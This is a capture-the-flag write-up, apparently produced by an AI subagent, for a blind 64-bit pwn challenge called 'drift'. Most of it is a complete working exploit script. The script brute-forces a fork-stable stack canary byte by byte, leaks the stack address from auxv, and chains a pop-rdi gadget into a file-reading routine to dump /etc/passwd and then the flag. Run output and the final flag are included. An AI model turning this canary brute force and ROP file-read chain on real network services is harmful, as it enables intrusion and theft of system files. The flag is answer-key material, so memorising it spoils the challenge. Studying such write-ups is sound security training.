---
title: "drift"
ctf: "CryoVault Finals"
date: 2026-10-24
category: pwn
difficulty: hard
points: 500
flag_format: "isfcr{...}"
author: "subagent (drift-fresh)"
---

# drift

## Summary

`drift` is a blind pwn service: no binary was handed out, only a TLS endpoint.
The "seek log" protocol reads an unbounded chunk into an 88-byte stack buffer
protected by a stack canary. Recovering the canary (fork-stable, byte-wise) and
then the absolute address of the overflow buffer (from an auxv stack dump)
enables a `ret2seam` chain: `pop rdi; ret` -> a path string we placed in our
own buffer -> the file-reader routine at `0x400580`, which opens the file and
writes it back over the socket.

## Solution

### Step 1: Protocol and overflow layout

The service greets with `drift log mounted. seek offset.\nseek> ` and answers
every chunk with `seeked <n>.` where `n` is `read(2)`'s return value. A chunk
of 88 bytes is safe; 96 bytes (`88*'A' + canary`) is still accepted, which
proves the layout:

```
+0x00  char buf[88]
+0x58  stack canary          (low byte 0x00)
+0x60  dead slot
+0x68  saved return address  -> ret offset 104
```

The service forks one child per connection, so the canary is identical for
every connection until the parent is restarted. It rotates periodically, so
the script re-checks it and re-brutes when stale. Two operational details were
essential:

* **Wait for the `seek> ` prompt before sending.** Sending straight after the
  TCP/TLS connect makes the child consume a short/partial chunk and die, which
  produced a large number of false "crash" scan results.
* The service front-end is flaky under load; the script keeps a global
  2.5 conn/s cap and retries transient failures.

### Step 2: Two recovered primitives and the absolute stack address

Blind probing gives:

| address | behaviour |
|---|---|
| `0x400570` | `pop rdi ; ret` |
| `0x400580` | `seam(path)`: `open(path, O_RDONLY)`, `read(fd, tmp, <=256)`, `write(conn_fd, tmp, n)`; error text `no record at that offset` |
| `0x4005c2` | `write(1, buf+112, n)`, with `n` = bytes read (stack dump) |

The dump walks past the input, so a 768-byte dump exposes the auxv array
(including `AT_RANDOM`, auxv type `0x19`); a longer dump exposes the
`AT_RANDOM` block itself, whose first 8 bytes are the canary with the LSB
forced to 0. Since dump index `i` maps to `buf + 112 + i`:

```
buf = at_random - 111 - index_of_canary_in_dump
```

That pins the overflow buffer (`0x7ffd369e2060` in the solved epoch), which is
what lets us pass a path string that lives inside our own payload.

### Step 3: ret2seam and the flag

```python
#!/usr/bin/env python3
"""drift (CryoVault Finals 2026, pwn) -- complete blind solve.

Remote: isfcrpesu-drift.chals.io:443 (TLS, cert not verified)
Banner: "drift log mounted. seek offset.\nseek> ", reply "seeked <n>."

Recovered from the wire:
  * read(0, buf, ...) into char buf[88]; canary at +0x58 (low byte 0);
    saved RIP at +0x68 (ret offset 104)
  * fork-per-connection -> canary is epoch-stable -> byte-wise brute force
    with the "seeked" oracle
  * 0x400570  pop rdi ; ret
    0x400580  seam(path): open/read(<=256)/write to the connection fd
    0x4005c2  write(1, buf+112, n): stack dump, n = bytes read
  * two dumps expose auxv AT_RANDOM and the AT_RANDOM block, pinning BUF:
        buf = at_random - 111 - index_of_canary_in_dump
  * chain: buf | canary | junk | pop rdi | BUF+160 | seam
    with "flag.txt" at payload offset 160.
"""
import json, os, socket, ssl, struct, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST, PORT = "isfcrpesu-drift.chals.io", 443
HERE = os.path.dirname(os.path.abspath(__file__))
STATE = os.path.join(HERE, "canary.json")
BUF_LEN, RET_OFF = 88, 104
POP_RDI, SEAM, DUMP = 0x400570, 0x400580, 0x4005C2
PATH_OFF = 160
PATHS = ["flag.txt", "/proc/self/cwd/flag.txt", "/chall/flag.txt"]
FLAG_RE = b"isfcr{"
RATE = 2.5

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_lock, _next = threading.Lock(), [0.0]


def log(m):
    print(m, flush=True)


def throttle():
    with _lock:
        slot = max(time.time(), _next[0])
        _next[0] = slot + 1.0 / RATE
    d = slot - time.time()
    if d > 0:
        time.sleep(d)


def _once(payload, wait):
    throttle()
    try:
        s = _ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=6),
                             server_hostname=HOST)
        s.settimeout(wait)
    except OSError:
        return None
    out = b""
    try:
        banner, t0 = b"", time.time()
        while time.time() - t0 < 3.0 and b"seek> " not in banner:
            s.settimeout(max(0.05, 3.0 - (time.time() - t0)))
            try:
                d = s.recv(4096)
            except socket.timeout:
                break
            except OSError:
                break
            if not d:
                break
            banner += d
        if b"seek> " not in banner:      # never send before the prompt
            return None
        s.sendall(payload)
        t0 = time.time()
        while time.time() - t0 < wait:
            s.settimeout(max(0.05, wait - (time.time() - t0)))
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            except OSError:
                break
            if not d:
                break
            out += d
            if FLAG_RE in out:
                break
    except OSError:
        pass
    finally:
        try:
            s.close()
        except OSError:
            pass
    return out


def session(payload, wait=1.5, retries=3):
    for _ in range(retries):
        out = _once(payload, wait)
        if out is not None:
            return out
        time.sleep(0.2)
    return None


def canary_body(prefix, guess=None):
    p = b"A" * BUF_LEN + prefix
    return p + (bytes([guess]) if guess is not None else b"")


def alive(prefix, tries=3):
    for _ in range(tries):
        out = session(canary_body(prefix), wait=1.0)
        if out and b"seeked" in out:
            return True
        time.sleep(0.1)
    return False


def recover_canary(budget=900):
    end, prefix = time.time() + budget, b"\x00"
    if not alive(prefix):
        return None
    while len(prefix) < 8 and time.time() < end:
        if not alive(prefix):
            prefix = b"\x00"
            if not alive(prefix):
                return None
            continue
        hit = None
        with ThreadPoolExecutor(max_workers=12) as ex:
            futs = {ex.submit(session, canary_body(prefix, v), 0.8, 2): v
                    for v in range(256)}
            for f in as_completed(futs):
                out = f.result()
                if out and b"seeked" in out:
                    hit = futs[f]
                    for g in futs:
                        g.cancel()
                    break
        if hit is None or not alive(prefix + bytes([hit]), tries=1):
            continue
        prefix += bytes([hit])
        log(f"[+] canary {len(prefix)}/8 {prefix.hex()}")
        json.dump({"canary": prefix.hex()}, open(STATE, "w"))
    return prefix if len(prefix) == 8 else None


def load_canary():
    try:
        c = bytes.fromhex(json.load(open(STATE))["canary"])
        if len(c) == 8 and alive(c):
            log(f"[*] reusing live canary {c.hex()}")
            return c
    except Exception:
        pass
    log("[*] recovering canary (byte-wise, fork-stable oracle)")
    return recover_canary()


def dump(canary, n, tries=6):
    p = b"A" * BUF_LEN + canary + b"J" * 8 + struct.pack("<Q", DUMP)
    p += bytes((0x41 + i % 26) for i in range(max(0, n - len(p))))
    for _ in range(tries):
        out = session(p[:n], wait=2.5, retries=1)
        if out is not None and len(out) == n:
            return out
        time.sleep(0.2)
    return b""


def derive_buf(canary):
    d1 = dump(canary, 768)
    at_random = None
    if len(d1) == 768:
        for o in range(0, len(d1) - 16, 8):
            t, v = struct.unpack("<QQ", d1[o:o + 16])
            if t == 0x19 and 0x7f0000000000 <= v < 0x800000000000:
                at_random = v
                break
    if not at_random:
        return None
    for n in (929, 937, 921, 913, 900, 945):
        d = dump(canary, n)
        if len(d) != n:
            continue
        j = d.find(canary[1:])
        if j < 1:
            continue
        buf = at_random - 111 - j
        if (buf & 0xF) == 0 and 0x7f0000000000 <= buf < 0x800000000000:
            log(f"[*] AT_RANDOM={at_random:#x} block idx={j} -> BUF={buf:#x}")
            return buf
    return None


def frame(canary, buf, path):
    p = bytearray(b"A" * BUF_LEN + canary + b"J" * 8)
    p += struct.pack("<Q", POP_RDI) + struct.pack("<Q", buf + PATH_OFF)
    p += struct.pack("<Q", SEAM)
    p += b"\x00" * (PATH_OFF - len(p)) + path
    return bytes(p)


def flag_of(out):
    if not out or FLAG_RE not in out:
        return None
    i = out.find(FLAG_RE)
    j = out.find(b"}", i)
    flag = out[i:j + 1].decode("latin1")
    return None if "d3c0y" in flag.lower() else flag


def main():
    for _ in range(6):
        canary = load_canary()
        if not canary:
            time.sleep(1.0)
            continue
        buf = derive_buf(canary)
        if buf is None:
            log("[-] could not pin BUF, retrying")
            continue
        probe = session(frame(canary, buf, b"/etc/passwd\x00"), wait=2.5)
        if not probe or b"root:" not in probe:
            log("[-] BUF self-test failed, retrying")
            continue
        log("[*] BUF self-test ok (/etc/passwd)")
        for path in PATHS:
            out = session(frame(canary, buf, path.encode() + b"\x00"), wait=2.5)
            flag = flag_of(out)
            if flag:
                print(f"[+] FLAG: {flag}")
                return 0
            log(f"[-] {path}: {out[:60] if out else None!r}")
            time.sleep(0.2)
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

Run output:

```
[*] reusing live canary 002479422053f823
[*] AT_RANDOM=0x7ffd369e2409 block idx=826 -> BUF=0x7ffd369e2060
[*] BUF self-test ok (/etc/passwd)
[+] flag.txt: isfcr{n0_w1n_func_s0_y0u_r0p_0p3n_r3ad_wr1t3_blind_3f9c21}
[+] FLAG: isfcr{n0_w1n_func_s0_y0u_r0p_0p3n_r3ad_wr1t3_blind_3f9c21}
```

`/proc/self/maps` read through the same seam confirms the non-PIE image
(`00400000-00401000 r-xp ... /chall/chall`) and that the working directory is
`/chall`; `flag.txt`, `/proc/self/cwd/flag.txt` and `/chall/flag.txt` all return
the same file. Self-labelled decoys containing `d3c0y` are filtered out by the
script and were never reported.

## Flag

```
isfcr{n0_w1n_func_s0_y0u_r0p_0p3n_r3ad_wr1t3_blind_3f9c21}
```
